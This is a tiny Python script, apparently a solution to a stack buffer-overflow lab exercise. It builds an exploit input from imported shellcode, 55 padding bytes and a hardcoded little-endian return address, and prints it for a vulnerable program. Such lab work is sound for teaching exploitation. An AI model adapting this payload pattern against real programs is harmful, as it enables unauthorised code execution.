from shellcode import shellcode
import sys

add = b'\x45'*55+b'\x0c'+b'\x71'+b'\xfe'+b'\xbf'

sys.stdout.buffer.write(shellcode+add)
